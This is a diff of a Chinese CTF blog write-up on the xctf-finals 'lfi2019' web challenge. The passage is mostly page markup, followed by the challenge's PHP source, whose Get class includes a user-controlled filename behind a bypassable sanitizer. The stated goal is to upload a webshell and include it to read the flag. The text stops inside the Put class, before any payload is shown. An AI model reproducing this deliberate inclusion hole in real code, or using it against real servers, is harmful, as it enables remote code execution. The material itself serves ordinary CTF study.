@@ -1,405 +1,1156 @@
 <!DOCTYPE html>
-<html>
-  <head>
-      <script>
-  var _hmt = _hmt || []
-  ;(function() {
-    var hm = document.createElement('script')
-    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
-    var s = document.getElementsByTagName('script')[0]
-    s.parentNode.insertBefore(hm, s)
-  })()
-</script> 
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="keywords" content="" />
-    <meta name="description" content="学无止境啊!学吧,太深了!" />
-    
-    <title>
-      代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019 - 欢迎来访哦!
-    </title>
-    <link rel="manifest" href="/manifest.json" />
-    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-    
-<link rel="stylesheet" href="/style/style.css">
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019 | 欢迎来访</title>
+  <meta name="description" content="1.审计源码意思就是让上传个马,然后包含过去读flag 要把一些无关紧要的代码略过 1)实现put,get功能的代码:$parsed_url &#x3D; explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]);    if(count($parsed_url) &gt;&#x3D; 2){  ​    header(&quot;Content-Typ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019">
+<meta property="og:url" content="http://perthinking.xyz/CTF/2/index.html">
+<meta property="og:site_name" content="欢迎来访哦!">
+<meta property="og:description" content="1.审计源码意思就是让上传个马,然后包含过去读flag 要把一些无关紧要的代码略过 1)实现put,get功能的代码:$parsed_url &#x3D; explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]);    if(count($parsed_url) &gt;&#x3D; 2){  ​    header(&quot;Content-Typ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/1.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/2.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/3.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/4.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/5.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/6.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/7.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/8.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/9.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/10.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/11.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/12.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/13.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/14.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/15.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/16.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/17.png">
+<meta property="og:image" content="http://perthinking.xyz/CTF/2/18.png">
+<meta property="article:published_time" content="2020-05-05T02:33:11.000Z">
+<meta property="article:modified_time" content="2020-05-13T07:26:24.629Z">
+<meta property="article:author" content="1eng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://perthinking.xyz/CTF/2/1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://perthinking.xyz/CTF/2/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="欢迎来访哦!" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-  <meta name="generator" content="Hexo 4.2.0"></head>
-  <body>
-    <canvas id='pagemap'></canvas>
-    
-    <div id="post-toc" class="animated hiddenToc hide">
-      <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#审计源码"><span class="toc-text">审计源码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-实现put-get功能的代码"><span class="toc-text">1)实现put,get功能的代码:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-get功能块"><span class="toc-text">2)get功能块:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-put功能块"><span class="toc-text">3)put功能块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-过滤函数"><span class="toc-text">4)过滤函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-还有这段代码"><span class="toc-text">5)还有这段代码:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-分析put要过滤的点"><span class="toc-text">2.分析put要过滤的点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-分析get要过滤的点"><span class="toc-text">3.分析get要过滤的点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-windows-FindFirstFile利用"><span class="toc-text">4.windows  FindFirstFile利用</span></a></li></ol>
-    </div>
-    
-    <div id="fixed-menu-wrap">
-      <span class="iconfont icon-sousuo search-box menu-reset"></span>
-      <span class="icon-toc menu-reset">Toc</span>
-      <span class="iconfont icon-arrowup menu-reset"></span>
-    </div>
-    <div id="fixed-menu">
-      <span class="iconfont icon-menu-"></span>
-    </div>
-    <div id="progress">
-      <div class="line"></div>
-    </div>
-    <div id="search-shade" class="animated hiddenSearch hide">
-      <div class="input-wrap">
-        <span class="iconfont icon-sousuo search-box"></span>
-        <input type="text" placeholder="Search" />
-        <span class="iconfont icon-close"></span>
-      </div>
-      <div class="search-result">
-        <div class="meta">
-          <span><b id="result-count">0</b> results found</span>
-          <img src="/images/logo.jpeg" />
-        </div>
-        <ul id="result-box"></ul>
-      </div>
-    </div>
-    <div id="menu-mask" class="animated hideMenuMask hide">
-      <span class="iconfont icon-close"></span>
-      <div class="nav">
-        
-        <a href="/" class="">
-          首页
-        </a>
-        
-        <a href="/archives" class="">
-          归档
-        </a>
-        
-        <a href="/categories" class="">
-          分类
-        </a>
-        
-        <a href="/tags" class="">
-          标签
-        </a>
-        
-        <a href="/friends" class="">
-          友链
-        </a>
-        
-        <a href="/about" class="">
-          关于
-        </a>
-        
-      </div>
-    </div>
-    <div id="header">
-      <div class="intro">
-        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
-        <div class="author">1eng</div>
-      </div>
-      <div class="nav">
-        <span class="iconfont icon-menu menu-icon"></span>
-        <a href="#" class="search-box">
-          <span class="iconfont icon-sousuo"></span>
-        </a>
-      </div>
-    </div>
-    <div id="side" class="animated bounceInLeft">
-      <div class="shrink">
-        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
-        <span class="iconfont icon-menu toggle-icon"></span>
-        <a href="#" class="search-box">
-          <span class="iconfont icon-sousuo"></span>
-        </a>
-      </div>
-      <div class="magnify">
-        <div class="about">
-          <div class="author">1eng</div>
-          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
-        </div>
+  
+  
+  
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
 
-        <div class="nav">
-          
-          <a href="/" class="">
-            首页
-          </a>
-          
-          <a href="/archives" class="">
-            归档
-          </a>
-          
-          <a href="/categories" class="">
-            分类
-          </a>
-          
-          <a href="/tags" class="">
-            标签
-          </a>
-          
-          <a href="/friends" class="">
-            友链
-          </a>
-          
-          <a href="/about" class="">
-            关于
-          </a>
-          
-          <a href="#" class="search-box">
-            <span class="iconfont icon-sousuo"></span>
-          </a>
-        </div>
-        <div class="bottom">
-          <div class="follow">
-            
-            <a href="https://github.com/1eng" target="_block">
-              <span class="iconfont icon-github"></span>
-            </a>
-            
-            <a href="2469133675" target="_block">
-              <span class="iconfont icon-QQ"></span>
-            </a>
-             
-            <a href="/atom.xml" target="_block">
-              <span class="iconfont icon-rss"></span>
-            </a>
-            
-          </div>
-        </div>
-      </div>
-    </div>
-    <div id="container">
-      <div class="main animated bounceInRight delay-0.7s">
-        <article class="post-entry">
-    <div class="header">
+
+<body class="main-center theme-blue" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
       
-      <div class="title">代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019</div>
-      <div class="meta">
-        <span class="item">
-          <span class="iconfont icon-time-circle"></span>
-          <span>2020/05/05</span>
-        </span>
-
-        
-          <span class="item leancloud-visitors" id="/CTF/2/" data-flag-title="代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019">
-            <span class="iconfont icon-eye1"></span>
-            <span class="leancloud-visitors-count"></span>
-          </span>
-        
-
-         
-        <span class="item">
-          <span class="iconfont icon-folder"></span>
-          <span>
-              
-                
-                  <a href="/categories/CTF">CTF</a>
-                
-              
-          </span>
-        </span>
-        
-        
-        
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/1eng" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">1eng</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Information Security &amp; Student</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 江西, 中国</small>
       </div>
-      <div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/1eng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/markwhile1" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTB%E9%9D%B6%E6%9C%BA/">HTB靶机</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/CTF/">CTF</a>
+              </p>
+              <p class="item-title">
+                <a href="/CTF/6/" class="title">Soapclient+crlf+ssrf(原理)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-06T01:31:01.000Z" itemprop="datePublished">2020-05-06</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/CTF/">CTF</a>
+              </p>
+              <p class="item-title">
+                <a href="/CTF/5/" class="title">Flask-session伪造-[CISCN2019 华东南赛区]Web4</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-06T01:12:42.000Z" itemprop="datePublished">2020-05-06</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/CTF/">CTF</a>
+              </p>
+              <p class="item-title">
+                <a href="/CTF/4/" class="title">Bypass disfuction-攻防世界smarty</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-05T14:29:14.000Z" itemprop="datePublished">2020-05-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/CTF/">CTF</a>
+              </p>
+              <p class="item-title">
+                <a href="/CTF/3/" class="title">phar反序列化(原理)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-05T14:05:55.000Z" itemprop="datePublished">2020-05-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/HTB%E9%9D%B6%E6%9C%BA/">HTB靶机</a>
+              </p>
+              <p class="item-title">
+                <a href="/HTB%E9%9D%B6%E6%9C%BA/1/" class="title">HTB靶机练习-Control</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-05-05T13:01:18.000Z" itemprop="datePublished">2020-05-05</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-审计源码"><span class="toc-number">1.</span> <span class="toc-text">1.审计源码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-实现put-get功能的代码"><span class="toc-number">1.1.</span> <span class="toc-text">1)实现put,get功能的代码:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-get功能块"><span class="toc-number">1.2.</span> <span class="toc-text">2)get功能块:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-put功能块"><span class="toc-number">1.3.</span> <span class="toc-text">3)put功能块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-过滤函数"><span class="toc-number">1.4.</span> <span class="toc-text">4)过滤函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-还有这段代码"><span class="toc-number">1.5.</span> <span class="toc-text">5)还有这段代码:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-分析put要过滤的点"><span class="toc-number">2.</span> <span class="toc-text">2.分析put要过滤的点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-分析get要过滤的点"><span class="toc-number">3.</span> <span class="toc-text">3.分析get要过滤的点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-windows-FindFirstFile利用"><span class="toc-number">4.</span> <span class="toc-text">4.windows  FindFirstFile利用</span></a></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-ctf2" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/CTF/2/" class="article-date">
+	  <time datetime="2020-05-05T02:33:11.000Z" itemprop="datePublished">2020-05-05</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </span>
+
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/CTF/2/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2.1k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 11(分)</span>
+	
+
       </div>
     </div>
-    <html><head></head><body><h1 id="审计源码">审计源码<a class="post-anchor" href="#审计源码"></a></h1><p>意思就是让上传个马,然后包含过去读flag</p>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="1-审计源码"><a href="#1-审计源码" class="headerlink" title="1.审计源码"></a>1.审计源码</h1><p>意思就是让上传个马,然后包含过去读flag</p>
 <p>要把一些无关紧要的代码略过</p>
-<h2 id="1-实现put-get功能的代码">1)实现put,get功能的代码:<a class="post-anchor" href="#1-实现put-get功能的代码"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plain">$parsed_url = explode("&", $_SERVER['QUERY_STRING']);<br><br>  if(count($parsed_url) >= 2){<br><br>​    header("Content-Type:text/json");<br><br>​    switch($parsed_url[0]){<br><br>​      case "get":<br><br>​        $get = new Get($parsed_url[1]);<br><br>​        $data = $get->get();<br><br>​        break;<br><br>​      case "put":<br><br>​        $put = new Put($parsed_url[1], $_POST);<br><br>​        $data = $put->put();<br><br>​        break;<br><br>​      default:<br><br>​        $data = ["msg" => "Invalid data."];<br><br>​        break;<br><br>​    }<br><br>​    die(json_encode($data));<br><br>  }<br></code></pre></td></tr></tbody></table></figure>
+<h2 id="1-实现put-get功能的代码"><a href="#1-实现put-get功能的代码" class="headerlink" title="1)实现put,get功能的代码:"></a>1)实现put,get功能的代码:</h2><pre><code>$parsed_url = explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]);
+
+  if(count($parsed_url) &gt;= 2){
+
+​    header(&quot;Content-Type:text/json&quot;);
+
+​    switch($parsed_url[0]){
+
+​      case &quot;get&quot;:
+
+​        $get = new Get($parsed_url[1]);
+
+​        $data = $get-&gt;get();
+
+​        break;
+
+​      case &quot;put&quot;:
+
+​        $put = new Put($parsed_url[1], $_POST);
+
+​        $data = $put-&gt;put();
+
+​        break;
+
+​      default:
+
+​        $data = [&quot;msg&quot; =&gt; &quot;Invalid data.&quot;];
+
+​        break;
+
+​    }
+
+​    die(json_encode($data));
+
+  }</code></pre><h2 id="2-get功能块"><a href="#2-get功能块" class="headerlink" title="2)get功能块:"></a>2)get功能块:</h2><pre><code>class Get {
+
+​    protected function nanahira(){
+
+​      // senpai notice me //
+
+​      function exploit($data){
+
+​        $exploit = new System();
+
+​      }
+
+​      $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);
+
+​    }
+
+​    private $filename;
+
+​    function __construct($filename){
+
+​      $this-&gt;filename = path_sanitizer($filename);
+
+​    }
+
+​    function get(){
+
+​      if($this-&gt;filename === false){
+
+​        return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​      }
+
+​      // wtf???? //
+
+​      if(!@file_exists($this-&gt;filename)){
+
+​        // index files are *completely* disabled. //
+
+​        if(stripos($this-&gt;filename, &quot;index&quot;) !== false){
+
+​          return [&quot;msg&quot; =&gt; &quot;you cannot include index files!&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​        }
 
 
 
-<h2 id="2-get功能块">2)get功能块:<a class="post-anchor" href="#2-get功能块"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs plain">class Get {<br><br>​    protected function nanahira(){<br><br>​      // senpai notice me //<br><br>​      function exploit($data){<br><br>​        $exploit = new System();<br><br>​      }<br><br>​      $_GET['trigger'] && !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']);<br><br>​    }<br><br>​    private $filename;<br><br>​    function __construct($filename){<br><br>​      $this->filename = path_sanitizer($filename);<br><br>​    }<br><br>​    function get(){<br><br>​      if($this->filename === false){<br><br>​        return ["msg" => "blocked by path sanitizer", "type" => "error"];<br><br>​      }<br><br>​      // wtf???? //<br><br>​      if(!@file_exists($this->filename)){<br><br>​        // index files are *completely* disabled. //<br><br>​        if(stripos($this->filename, "index") !== false){<br><br>​          return ["msg" => "you cannot include index files!", "type" => "error"];<br><br>​        }<br><br> <br><br>​        // hardened sanitizer spawned. thus we sense ambiguity //<br><br>​        $read_file = "./files/" . $this->filename;<br><br>​        $read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);<br><br> <br><br>​        if($read_file === $read_file_with_hardened_filter ||<br><br>​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){<br><br>​          return ["msg" => "request blocked", "type" => "error"];<br><br>​        }<br><br>​        // .. and finally, include *un*exploitable file is included. //<br><br>​        @include("./files/" . $this->filename);<br><br>​        return ["type" => "success"];<br><br>​      }else{<br><br>​        return ["msg" => "invalid filename (wtf)", "type" => "error"];<br><br>​      }<br><br>​    }<br><br>  }<br></code></pre></td></tr></tbody></table></figure>
+​        // hardened sanitizer spawned. thus we sense ambiguity //
+
+​        $read_file = &quot;./files/&quot; . $this-&gt;filename;
+
+​        $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true);
 
 
 
-<h2 id="3-put功能块">3)put功能块<a class="post-anchor" href="#3-put功能块"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs plain">class Put {<br><br>​    protected function nanahira(){<br><br>​      // senpai notice me //<br><br>​      function exploit($data){<br><br>​        $exploit = new System();<br><br>​      }<br><br>​      $_GET['trigger'] && !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']);<br><br>​    }<br><br>​    private $filename;<br><br>​    private $content;<br><br>​    private $dir = "./files/";<br><br>​    function __construct($filename, $data){<br><br>​      global $seed;<br><br>​      if((string)$filename === (string)@path_sanitizer($data['filename'])){<br><br>​        $this->filename = (string)$filename;<br><br>​      }else{<br><br>​        $this->filename = false;<br><br>​      }<br><br>​      $this->content = (string)@code_sanitizer($data['content']);<br><br>​    }<br><br>​    function put(){<br><br>​      // just another typical file insertion //<br><br>​      if($this->filename === 